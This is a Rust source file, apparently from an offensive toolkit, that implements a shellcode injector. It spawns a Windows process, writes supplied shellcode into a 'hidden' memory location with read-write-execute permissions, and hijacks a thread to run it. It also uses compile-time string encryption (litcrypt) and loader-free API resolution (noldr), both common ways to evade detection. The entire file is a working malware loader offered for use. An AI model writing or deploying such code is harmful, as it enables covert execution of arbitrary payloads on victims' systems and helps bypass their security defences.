pub use winapi;
use winapi::um::{processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA}, winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS}};

use NtCreateUserProcess_rs::CreateSuspendedProcess;
use noldr::{get_dll_address, get_function_address, get_teb};

mod func;
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

pub fn helper_func(process_name: &str, scode: &[u8]) -> Result<String, String> {
    let result = inject_shellcode(process_name, scode);

    result
}

fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<String, String> {
    // Format the process path
    let process_path = if !process_name.contains('\\') {
        format!("C:\\Windows\\System32\\{}", process_name)
    } else {
        process_name.to_string()
    };

    // Create the startup info and process info structs
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    // Create the process
    let success = unsafe {
        CreateProcessA(
            std::ptr::null(),
            process_path.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1,
            NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        return Err(format!("Failed to create process: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
    }

    let process_handle = pi.hProcess;
    let shellcode_size = shellcode.len();
    
    let shellcode_location = func::get_hidden_injection_address(process_handle, shellcode_size)
        .map_err(|e| format!("Failed to get injection address: {}", e))?;

    if !func::inject_and_rwx(process_handle, shellcode_location, shellcode) {
        return Err("Failed to inject shellcode".to_string());
    }

    if !func::snap_thread_hijack(
        pi.dwProcessId,
        pi.hThread,
        pi.dwThreadId,
        process_handle,
        Some(shellcode_location),
        None,
    ) {
        return Err("Failed to hijack thread".to_string());
    }

    //Ok(())
    //if success, return a success message
    Ok("Shellcode injected successfully".to_string())
}